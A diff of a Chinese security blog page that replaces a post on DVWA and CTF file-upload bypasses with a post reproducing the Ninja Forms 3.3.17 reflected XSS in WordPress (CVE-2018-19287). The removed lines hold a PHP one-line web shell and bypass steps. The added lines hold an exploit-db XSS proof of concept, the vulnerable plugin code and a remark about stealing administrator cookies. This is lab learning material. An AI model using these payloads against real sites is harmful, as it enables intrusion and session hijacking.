@@ -4,9 +4,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="初窥文件上传, god_13">
-    <meta name="description" content="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧
-基于DVWA的文件上传（1）LOW级别low级别的文件上传什么都没有过滤掉，所以直接上传带有一句话木马的php文件就行php一句话木马如下所示&amp;lt;?php @e">
+    <meta name="keywords" content="wordpresss 插件XSS漏洞复现, god_13">
+    <meta name="description" content="前言wordpress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySql的数据库上架设属于自己的网站。同其它的CMS一样，他也有许多插件可以供使用，本文主要讲Ninja Forms 3.3.17的XSS漏洞（CVE-2018-">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>初窥文件上传 | god_13</title>
+    <title>wordpresss 插件XSS漏洞复现 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -258,13 +257,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        初窥文件上传
+                        wordpresss 插件XSS漏洞复现
                     </div>
                 </div>
             </div>
@@ -375,8 +374,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/漏洞复现/" target="_blank">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -390,21 +389,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2018-11-04
+                    2019-07-11
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        408
+                        774
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        3 Min
                     </div>
                     
                 
@@ -415,12 +414,80 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧"><a href="#头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧" class="headerlink" title="头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧"></a>头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧</h2><a id="more"></a>
-<h2 id="基于DVWA的文件上传"><a href="#基于DVWA的文件上传" class="headerlink" title="基于DVWA的文件上传"></a>基于DVWA的文件上传</h2><p><strong>（1）LOW级别</strong><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/low.PNG" alt=""><br>low级别的文件上传什么都没有过滤掉，所以直接上传带有一句话木马的php文件就行<br>php一句话木马如下所示<br><code>&lt;?php @eval($_POST[yjh]);?&gt;</code><br>上传结果如下所示<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/1.PNG" alt=""><br>这时候就可以上菜刀连了<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/2.PNG" alt=""><br>这就算是一次简单的上传了<br><strong>（2）Medium级别</strong><br>这个级别再上传php文件就不行了<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/3.PNG" alt=""><br>这时候就要靠抓包了，上传png文件然后抓包，把feilname的后缀改为php，再把burp给off掉就能上传上去了，之后就能上菜刀连了<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/4.PNG" alt=""><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/5.PNG" alt=""></p>
-<p><strong>（3）High级别</strong><br>这道题目需要上传的是自制的图片，其中附带有一句话木马<br>需要的原材料有：一张图片，写好的一句话木马，里面写上cmd的bat文件<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/6.PNG" alt=""><br>然后打开cmd，敲命令<br><code>copy header.jpg/b+1.php header1.jpg</code><br>把制作好的header1上传上去就能上传成功，之后就能连菜刀了</p>
-<h2 id="南邮题目上传绕过（00截断）"><a href="#南邮题目上传绕过（00截断）" class="headerlink" title="南邮题目上传绕过（00截断）"></a>南邮题目上传绕过（00截断）</h2><p><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/7.PNG" alt=""></p>
-<p><strong>传.jpg类型的文件，结果爆出了一条路径/uploads/</strong><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/8.PNG" alt=""><br><strong>那我传.php的文件</strong><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/9.PNG" alt=""><br><strong>就没有爆出路径</strong><br><strong>所以就抓包，而且是抓上传.jpg文件的包</strong><br><strong>原包</strong><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/10.PNG" alt=""><br><strong>修改过后的包，就是在原来爆出的路径后面加上1.php，注意1.php后面有空格方便找出hex为20的值并改为00（00截断）</strong><br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/11.PNG" alt=""><br>爆出flag<br><img src="/2018/11/04/chu-kui-wen-jian-shang-chuan/12.PNG" alt=""></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>上传绕过的方法很多，还有很长的路要走啊！</strong></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>wordpress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySql的数据库上架设属于自己的网站。同其它的CMS一样，他也有许多插件可以供使用，本文主要讲Ninja Forms 3.3.17的XSS漏洞（CVE-2018-19287）复现</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>先去官网下载相应版本的wordpress，网址：<a href="https://cn.wordpress.org/download/releases/" target="_blank" rel="noopener">https://cn.wordpress.org/download/releases/</a><br>这里我们下载4.4版本，同样的还要下载对应版本的插件<br>，网址：<a href="https://downloads.wordpress.org/plugin/ninja-forms.3.3.17.zip" target="_blank" rel="noopener">https://downloads.wordpress.org/plugin/ninja-forms.3.3.17.zip</a><br>下载完后要把插件解压到/wp-content/plugins目录下，里面存放的都是wp的插件。<br>完成后就去后台把插件启用<br><img src="/2019/07/11/wordpresss-cha-jian-xss-lou-dong-fu-xian/1.PNG" alt=""><br>环境搭建是需要注意的是需要自己添加一个数据库来存放数据，使用命令</p>
+<pre><code>CREATE DATABASE 数据库名;
+</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>一个漏洞数据库平台：<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a><br>里面记录了各种各样的已知漏洞及其poc，可以用于复现。从exploit-db上复制的poc：</p>
+<pre><code>
+http://127.0.0.1/wp-admin/edit.php?post_status=trash&amp;post_type=nf_sub&amp;form_id=1&quot;&gt;&lt;script&gt;alert(/POC3/);&lt;/script&gt;&amp;nf_form_filter&amp;paged=1
+</code></pre><p>实际利用的时候要根据自己的路径来进行相应的修改，使用方法直接复制到浏览器就可以触发XSS，实际利用的时候可以通过留言的方式去攻击。<br><img src="/2019/07/11/wordpresss-cha-jian-xss-lou-dong-fu-xian/2.PNG" alt=""><br>能弹窗的话我们就可以利用xss平台获取管理员的cookie来进行登陆了。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据poc分析漏洞成因，通过关键字nf_sub确定核心文件\wp-content\plugins\ninja-forms\includes\Admin\Menus\Submissions.php。</p>
+<pre><code>//这是一个改变视图的函数
+public function change_views( $views )
+
+    {
+
+        // 删除没用的视图
+
+        unset( $views[ &#39;mine&#39; ] );
+
+        unset( $views[ &#39;publish&#39; ] );
+
+        // 如果from_id不为空
+
+        if( ! empty( $_GET[ &#39;form_id&#39; ] ) ) {
+
+            // 把剩余的部分布到库中
+
+            $form_id = &#39;&amp;form_id=&#39; . $_GET[ &#39;form_id&#39; ] . &#39;&amp;nf_form_filter&amp;paged=1&#39;;
+
+        } else {
+
+            // 否则返回空字符串
+
+            $form_id = &#39;&#39;;
+
+        }
+
+        // 创建自己的视图
+
+        $views[ &#39;all&#39; ] = &#39;&lt;a href=&quot;&#39; . admin_url( &#39;edit.php?post_status=all&amp;post_type=nf_sub&#39;  ) . $form_id . &#39;&quot;&gt;&#39;
+
+                        . __( &#39;Completed&#39;, &#39;ninja-forms&#39; ) . &#39;&lt;/a&gt;&#39;;
+
+        $views[ &#39;trash&#39; ] = &#39;&lt;a href=&quot;&#39; . admin_url( &#39;edit.php?post_status=trash&amp;post_type=nf_sub&#39; ) . $form_id . &#39;&quot;&gt;&#39;
+
+                            . __( &#39;Trashed&#39;, &#39;ninja-forms&#39; ) . &#39;&lt;/a&gt;&#39;;
+
+        // 检查状态
+
+        if( ! empty( $_GET[ &#39;post_status&#39; ] ) ) {
+
+            // Depending on the domain set the value to plain text.
+
+            if ( &#39;all&#39; == $_GET[ &#39;post_status&#39; ] ) {
+
+                $views[ &#39;all&#39; ] = __( &#39;Completed&#39;, &#39;ninja-forms&#39; );
+
+            } else if ( &#39;trash&#39; == $_GET[ &#39;post_status&#39; ] ) {
+
+                $views[ &#39;trash&#39; ] = __( &#39;Trashed&#39;, &#39;ninja-forms&#39; );
+
+            }
+
+        }
+
+        return $views;
+
+    }
+</code></pre><p>发现没有对form-id进行过滤</p>
+<pre><code>$form_id = &#39;&amp;form_id=&#39; . $_GET[ &#39;form_id&#39; ] . &#39;&amp;nf_form_filter&amp;paged=1&#39;;
+</code></pre><p>我们就可以考虑一下输入xss语句，其实，poc是根据</p>
+<pre><code> $views[ &#39;trash&#39; ] = &#39;&lt;a href=&quot;&#39; . admin_url( &#39;edit.php?post_status=trash&amp;post_type=nf_sub&#39; ) . $form_id . &#39;&quot;&gt;&#39;
+
+                            . __( &#39;Trashed&#39;, &#39;ninja-forms&#39; ) . &#39;&lt;/a&gt;&#39;;
+</code></pre><p>这句话来构造的，我们输入的格式已经很清楚的显示了出来。</p>
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1.XSS获取cookie进行免密登陆<br>2.漏洞函数的快速定位</p>
 
             </div>
             <hr>
@@ -576,9 +643,9 @@
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《初窥文件上传》
+                    《wordpresss 插件XSS漏洞复现》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2018/11/04/chu-kui-wen-jian-shang-chuan/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/11/wordpresss-cha-jian-xss-lou-dong-fu-xian/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -619,28 +686,28 @@
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2018/11/10/shi-yan-ba-writeup/">
+                <a href="/2019/07/11/wordpresss-cha-jian-xss-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="实验吧 writeup">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="wordpresss 插件XSS漏洞复现">
                         
-                        <span class="card-title">实验吧 writeup</span>
+                        <span class="card-title">wordpresss 插件XSS漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            后台登陆
-进入链接查看页面源代码，发现如下所示下面这一行代码是执行上面的sql语句并将结果赋值给result$result=mysqli_query($link,$sql);如果result的结果大于0if(mysqli_num_rows(
+                            前言wordpress是使用PHP语言开发的博客平台，用户可以在支持PHP和MySql的数据库上架设属于自己的网站。同其它的CMS一样，他也有许多插件可以供使用，本文主要讲Ninja Forms 3.3.17的XSS漏洞（CVE-2018-
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -649,11 +716,12 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/" target="_blank">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -667,24 +735,24 @@
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/10/27/php-wei-xie-yi/">
+                <a href="/2019/06/21/gai-si-de-cookie-deng-lu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="PHP伪协议">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="该死的cookie登陆">
                         
-                        <span class="card-title">PHP伪协议</span>
+                        <span class="card-title">该死的cookie登陆</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            php://filter的妙用1.解释什么是php://filter呢？php://filter 是一种元封装器，其设计的目的是用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile(
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-27
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-21
                             </span>
                         <span class="publish-author">
                             
